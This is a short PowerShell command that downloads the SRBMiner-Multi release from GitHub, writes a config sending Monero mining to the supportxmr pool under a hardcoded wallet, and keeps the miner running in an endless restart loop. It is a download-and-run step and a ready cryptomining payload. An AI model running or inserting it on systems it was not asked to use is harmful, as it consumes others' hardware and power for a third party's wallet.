powershell -Command "
    $ErrorActionPreference = 'Stop';
    try {
        # Download ZIP
        $zipUrl = 'https://github.com/doktor83/SRBMiner-Multi/releases/download/2.9.4/SRBMiner-Multi-2-9-4-win64.zip';
        $zipFile = 'srbminer.zip';
        Write-Host 'Downloading miner...';
        Invoke-WebRequest -Uri $zipUrl -OutFile $zipFile;
        Write-Host 'Extracting archive...';
        Expand-Archive -Path $zipFile -DestinationPath '.' -Force;
 # Find extracted folder
        $minerFolder = Get-ChildItem -Directory | Where-Object { $_.Name -like 'SRBMiner-Multi*' } | Select-Object -First 1;
        if (-not $minerFolder) {
            throw 'Extracted folder not found';
        }

        # Navigate to miner directory
        Set-Location $minerFolder.FullName;

        # Create config file
        @"
        {
          \"algorithm\": \"randomx\",
          \"pool\": \"pool.supportxmr.com:443\",
          \"wallet\": \"45WvRSeZuor9BbKMZF6s1VVvQriMjvScBbRLxoMTGe9c2J8Xnx4HySRHLLeTb8zf9944GD1uEmnpgUFFRHhJ7abSJXrmezb\",
          \"password\": \"x\",
          \"worker\": \"srb-cpu-gpu\",
          \"gpu_conf\": \"auto\",
          \"tls\": true
        }
        "@ | Out-File 'start_config.json' -Encoding ascii;

        # Start miner loop
        Write-Host 'Starting miner...';
        while ($true) {
            Start-Process -FilePath '.\SRBMiner-MULTI.exe' -ArgumentList '--config start_config.json --logfile miner.log' -NoNewWindow -Wait;
            Write-Host 'Miner exited. Restarting in 10 seconds...';
            Start-Sleep -Seconds 10;
        }
    }
    catch {
        Write-Host 'Error occurred: $_';
        exit 1;
    }
"
